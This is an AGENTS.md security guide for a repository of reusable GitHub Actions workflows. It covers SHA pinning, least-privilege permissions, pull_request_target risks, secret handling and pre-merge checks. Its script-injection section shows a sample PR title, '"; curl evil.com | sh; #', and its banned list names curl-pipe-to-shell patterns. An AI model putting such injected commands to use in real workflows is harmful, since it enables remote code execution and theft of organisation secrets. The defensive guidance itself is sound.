# babylonlabs-io/.github — AGENTS.md

Reusable GitHub Actions workflows consumed by **dozens of downstream babylonlabs-io
repos** via `uses: babylonlabs-io/.github/.github/workflows/<x>.yml@<ref>`. A merge to
`main` ships immediately to any downstream pinning a floating ref. **Every PR is a
supply-chain change.** Rules below derive from real fixes here (PRs #56, #67, #73,
#74, #76, #77, #78) — do not relax them.

## Top rules

1. **Never use `pull_request_target` with `actions/checkout` of the PR head.** That
   gives fork PR code access to org secrets. Default answer to "add
   `pull_request_target`": no.
2. **Every third-party `uses:` MUST be pinned to a 40-char SHA with either an
   exact `# vX.Y.Z` version comment or the approved `# unversioned` sentinel**
   (PR #77, for upstreams that don't publish release tags — see Action pinning
   below for the bar to add one). Enforced by `reusable_check_pinned_actions.yml`.
   No `actions/*` exception. Major tags (`@v4`) and branches (`@main`) are rejected.
3. **Every workflow MUST have a top-level `permissions:` block.** Default to
   `permissions: {}` and grant minimum at job level. Omission inherits the repo's
   default token scope (`read-all`/`write-all`) — unsafe.
4. **Never interpolate `${{ ... }}` directly inside a `run:` body.** Use `env:` and
   reference `$VAR`. Script-injection class bug, fixed repo-wide in #76.
5. **One concern per PR** — do not mix workflow logic, action pinning, and templates.

## Layout

```
.github/
  CODEOWNERS                            # @babylonlabs-io/devops owns everything
  workflows/
    reusable_authenticate_commits.yml   # SSH (FIDO2) commit signature gate
    reusable_backport.yml               # uses pull_request_target — see rules
    reusable_changelog_reminder.yml
    reusable_check_pinned_actions.yml   # the SHA-pin enforcer; do NOT weaken
    reusable_docker_pipeline.yml        # build + Trivy + Hadolint + push (OIDC)
    reusable_github_release.yml
    reusable_go_lint_test.yml
    reusable_go_releaser.yml
    reusable_node_lint_test.yml         # npm OIDC trusted publishing
    reusable_sync_branch.yml
CHANGELOG.md                            # update on every functional change
```

No `profile/README.md`, issue/PR templates, or composite actions
(`actions/<name>/action.yml`) today. If you add either, update this section.

## Versioning

- Releases are tags `vX.Y.Z` (current series: `v0.19.x`). Bump `CHANGELOG.md` under
  `## Unreleased` in the same PR.
- Downstream **should** pin to a tag (`@v0.19.2`). Many still pin `@main` — assume
  your PR is live on merge.
- Breaking changes (input rename, default flip, removed job) require a major bump
  and a migration note under `## Unreleased`.

## `pull_request_target`

Runs with **write access to org secrets** even for fork PRs — misuse exfiltrates
secrets across the org.

Allowed today: only `reusable_backport.yml`. The `tibdex/backport` action operates
on the **merged** base commit, gated on `github.event.pull_request.merged`, and
does not run PR code.

When touching or adding such workflows:

- **Never** set `actions/checkout` `ref:` to `github.event.pull_request.head.{sha,ref}`.
- **Never** run scripts, Make targets, npm scripts, or composite actions from the
  PR head.
- If you need PR head code (lint, test), use `pull_request` and accept that secrets
  are unavailable. `reusable_authenticate_commits.yml` uses `pull_request` for
  exactly this reason.

## Action pinning

`reusable_check_pinned_actions.yml` gates every `uses:` line: (1) 40-char hex SHA;
(2) exact version tag in trailing comment; (3) not `main`/`master`; (4) the pinned
SHA matches what the version tag resolves to via the GitHub API (catches force-pushed
tags — the `tj-actions/changed-files`-class attack).

Required format:

```yaml
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2 https://github.com/actions/checkout/releases/tag/v6.0.2
```

- **No exception for `actions/*`.** Major tags (`v4`) are force-pushed every
  release — use the exact patch tag (`v4.34.1`). PR #67 rationale.
- **`SKIP_REMOTE_CHECK`** (currently only `aquasecurity/trivy-action`, due to an
  IP allowlist on their API) — adding entries requires DevOps review with reason.
- **`# unversioned` sentinel** (PR #77) for upstreams without release tags
  (e.g. `dtolnay/rust-toolchain`). Locks the 40-char SHA, skips remote resolution.
  Same DevOps-review bar. Grep `# unversioned` to enumerate opt-outs.
- **Bulk updates**: PR #78 is the template — one PR, all bumps, exact tags in
  comments. Don't introduce floating tags "for readability".

## Permissions

Top-level `permissions:` is mandatory. Pattern: `permissions: {}` at top, then
grant minimum at job level. Current grants and why:

| Workflow | Scope | Reason |
|---|---|---|
| `reusable_docker_pipeline.yml` | `id-token: write`, `contents: read`, `security-events: write` | OIDC to AWS ECR; SARIF upload. |
| `reusable_node_lint_test.yml` | `id-token: write`, `contents: write`, `pull-requests: write` | npm OIDC + semantic-release. |
| `reusable_backport.yml` | `contents: write`, `pull-requests: write` | Open backport PR. |
| `reusable_go_releaser.yml` | `contents: write` | Create release. |
| `reusable_github_release.yml` | top-level `{}`, job `contents: write` | Create release. |
| `reusable_authenticate_commits.yml` | `contents: read`, `pull-requests: write` | Post sig verification comment. |
| All others | top-level `{}` + job `contents: read` | Default-deny. |

Never: `contents: write` on `pull_request` from forks; widening "to fix a 403"
without diagnosing root cause (usually wrong trigger / missing OIDC role, not
token scope); removing the top-level `permissions: {}` — it's what makes
job-level grants meaningful.

## Secrets

Today's references:

- `secrets.GITHUB_TOKEN` — scope governed by `permissions:`.
- `secrets.DOCKERHUB_{USERNAME,TOKEN}` — push in docker pipeline; pull-rate raise
  in `reusable_go_lint_test.yml`.
- `secrets.GO_PRIVATE_TOKEN`, `secrets.PRIVATE_REPO_TOKEN` — used for private
  repo access. Two carriers in this repo: (a) Docker builds route them through
  `docker/build-push-action` `secrets:` (BuildKit mount), **never** baked into
  image layers; (b) `reusable_go_lint_test.yml` writes `GO_PRIVATE_TOKEN` into a
  global git URL rewrite (`git config --global url.\"https://${GO_PRIVATE_TOKEN}@github.com/\".insteadOf`)
  so `go get` resolves private modules — that's a process-global write to
  `~/.gitconfig`, not a BuildKit mount, so future hardening (e.g. moving to a
  short-lived GitHub App token or sidecar) should audit this path. Masked with
  `::add-mask::`.
- `vars.AWS_ECR_{ACCOUNT,REGION,REGISTRY_ID}`, `vars.DOCKERHUB_REGISTRY_ID`,
  `vars.BABYLON_ALLOWED_SIGNERS` — non-secret config.

Rules: `secrets: inherit` in callers only when caller is a babylonlabs-io repo and
the called workflow needs them — prefer named secrets, never `inherit` in workflows
that could be reused outside the org. Never `set -x` in a step touching a secret.
Never `echo "$SECRET"` — use `echo "${#SECRET}"` to confirm presence. Never put a
secret into `${{ ... }}` inside a `run:` body (see next).

## Script injection — `env:`, not interpolation

`${{ ... }}` interpolated directly into a `run:` body is a script-injection bug:
GitHub Actions substitutes before the shell parses, so a PR title of
`"; curl evil.com | sh; #` becomes executable. Fixed repo-wide in #76.

```yaml
# WRONG
- run: echo "Building ${{ inputs.repoName }}"

# RIGHT
- env: { REPO_NAME: "${{ inputs.repoName }}" }
  run: echo "Building $REPO_NAME"
```

Applies to **every** `${{ ... }}` inside `run:` — `inputs.*`, `github.event.*`,
`vars.*`, `secrets.*`, `needs.*.outputs.*`, `matrix.*`. The only `${{ }}` allowed
inside a `run:` step is on the step's own `if:` expression.

## Triggers

- `pull_request` — safe for fork PRs (read-only token). Use for lint/test/sig.
- `pull_request_target` — see above. Default: no.
- `workflow_call` — primary trigger here.
- `push` — avoid; downstream consumes these as reusable workflows.
- `workflow_dispatch` — fine for ops; document inputs.

When touching a `pull_request`/`push` workflow, add `concurrency:` keyed on
`${{ github.workflow }}-${{ github.ref }}` with `cancel-in-progress: true` on
non-default branches. Not all have it — add when touching.

## Commit signatures

`reusable_authenticate_commits.yml` requires every PR commit be signed by an SSH
key in `vars.BABYLON_ALLOWED_SIGNERS`, defaulting to `sk-ssh-ed25519` (FIDO2).
Dependabot is exempted via three independent signals (login, immutable user ID
`49699333`, type `Bot`) and verified via the Commits API (PR #67).

- Do not weaken FIDO2 enforcement default to `false`.
- Do not check `github.actor` — it changes when a human pushes onto a Dependabot
  branch. Use `github.event.pull_request.user.*`.
- Do not widen the bot exemption without security review.

## Banned anti-patterns

- Replacing a pinned 40-char SHA with `@v4` or `@main` "for readability".
- Adding `pull_request_target` without security review and documented reason.
- Removing the top-level `permissions:` block.
- `run: bash <(curl ...)` / `curl ... | sh` — fetching+executing remote code.
- `${{ ... }}` interpolated into a `run:` body (use `env:`).
- `if: always()` placed to bypass a failing security step (Trivy, Hadolint,
  gosec, pinned-actions check, commit-sig check).
- Cross-cutting PR (workflow + action bumps + template) — split.
- `actions/checkout` without `persist-credentials: false` in a workflow that
  later runs **third-party actions against the checked-out tree**, or runs
  scripts/`make`/`npm`/composite actions sourced from the PR head, or runs
  any step capable of exfiltrating the auto-provisioned `GITHUB_TOKEN` (which
  the checkout step caches into the local git config by default). Trust
  boundary: if the next step in the same job is `aquasecurity/trivy-action`,
  `actions/setup-*` on PR head, an action you didn't author, or `run:` script
  derived from the PR diff, set `persist-credentials: false`. Workflows that
  only consume the SHA (e.g. `reusable_authenticate_commits.yml` reading commit
  metadata) are the documented baseline — match that pattern.
- Echoing a secret, even truncated. Use `${#SECRET}` only.
- A new `uses:` SHA without a matching `# vX.Y.Z` comment.

## Pre-merge checks

```bash
# 1. Workflow YAML lint (https://github.com/rhysd/actionlint)
actionlint .github/workflows/*.yml

# 2. Any unpinned uses: (must scan .yml AND .yaml — matches reusable_check_pinned_actions)
grep -rE 'uses:\s+[^/[:space:]]+/[^@[:space:]]+@[^[:space:]]+' \
     --include='*.yml' --include='*.yaml' .github/workflows/ \
  | grep -vE '@[0-9a-f]{40}\b'

# 3. Any ${{ ... }} inside a run: body. The single-line grep below misses the
#    far more common `run: |` multiline form — most shell steps use it, and a
#    dangerous interpolation on a later script line silently passes. Use both
#    checks together. The yq form is authoritative; awk is the no-deps fallback.
#
#    Authoritative (requires `yq`): list every step where `run` contains `${{`.
yq eval-all '
  .. | select(has("steps")) | .steps[]
  | select(.run != null and (.run | test("\\$\\{\\{")))
  | {"file": filename, "name": .name, "snippet": .run}
' .github/workflows/*.yml .github/workflows/*.yaml 2>/dev/null

#    Fallback: awk over multiline `run: |` blocks (single-line + folded scalars).
for f in .github/workflows/*.yml .github/workflows/*.yaml; do
  [ -e "$f" ] || continue
  awk '
    /^[[:space:]]*-?[[:space:]]*run:[[:space:]]*\|/ { in_run=1; indent=match($0,/[^ ]/); next }
    in_run && /\$\{\{/ { print FILENAME ":" NR ": " $0 }
    in_run && /^[[:space:]]*[^[:space:]]/ && match($0,/[^ ]/) <= indent { in_run=0 }
    /^[[:space:]]*-?[[:space:]]*run:.*\$\{\{/ { print FILENAME ":" NR ": " $0 }
  ' "$f"
done

# 4. Any pull_request_target (both extensions)
grep -nE 'pull_request_target' .github/workflows/*.yml .github/workflows/*.yaml 2>/dev/null

# 5. Top-level permissions present (both extensions — matches the action checker)
for f in .github/workflows/*.yml .github/workflows/*.yaml; do
  [ -e "$f" ] || continue
  grep -qE '^permissions:' "$f" || echo "MISSING permissions: $f"
done
```

CI: `reusable_check_pinned_actions.yml` runs on PR and gates SHA-pin rules.

## Change checklist

1. One concern per PR.
2. Update `CHANGELOG.md` under `## Unreleased`.
3. Run the pre-merge checks.
4. Security-sensitive workflows (`reusable_authenticate_commits`,
   `reusable_check_pinned_actions`, anything using `pull_request_target` or
   `id-token: write`) — request `@babylonlabs-io/devops` review explicitly and
   call out the security implication in the PR body.
5. After merge: cut `vX.Y.Z` and move `## Unreleased` items under the new version.
